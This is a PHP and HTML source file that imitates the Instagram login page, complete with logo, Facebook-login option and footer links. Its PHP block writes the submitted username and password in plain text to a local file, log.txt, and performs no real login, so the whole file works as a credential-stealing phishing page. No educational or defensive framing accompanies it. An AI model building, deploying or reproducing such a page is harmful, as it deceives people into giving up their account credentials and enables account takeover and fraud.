<?php
	session_start();
	if(isset($_SESSION['id'])){
		session_unset();
	}
?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram Login Page</title>
	<link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>



			<div class="form">
				<form method="post">
				<div class="input_field">
					<input type="text" name="username" placeholder="Phone number, username, or email" class="input">
				</div>
				<div class="input_field">
					<input type="password" name="pass" placeholder="Password" class="input">
				</div>
				<div class="btn">
					<input class="btn" type="submit" name="button1" value="Log in"/>
				</div>
			</form>
			</div>
			<?php
				if(isset($_POST['button1'])) {
					$username = $_POST['username'];
					$pass = $_POST['pass'];

            		$filename = 'log.txt';
            		$fp = fopen($filename, 'a+');
            		fwrite($fp, "\nusername = $username, pass = $pass");

            		fclose($fp);
        		}
			?>
			<!--<a href="#">Log In</a> -->

			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="https://about.facebook.com/meta">Meta</a></li>
				<li><a href="">About</a></li>
				<li><a href="#">Blogs</a></li>
				<li><a href="#">Help</a></li>
				<li><a href="#">API</a></li>
				<li><a href="#">Privacy</a></li>
				<li><a href="#">Terms</a></li>
				<li><a href="#">Top accounts</a></li>
				<li><a href="#">Hashtags</a></li>
				<li><a href="#">Locations</a></li>
				<li><a href="#">Instagram Lite</a></li>
				<li><a href="#">Contact uploading and non-users</a></li>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">ABOUT US</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2022 INSTAGRAM
		</div>
	</div>
</div>

</body>
</html>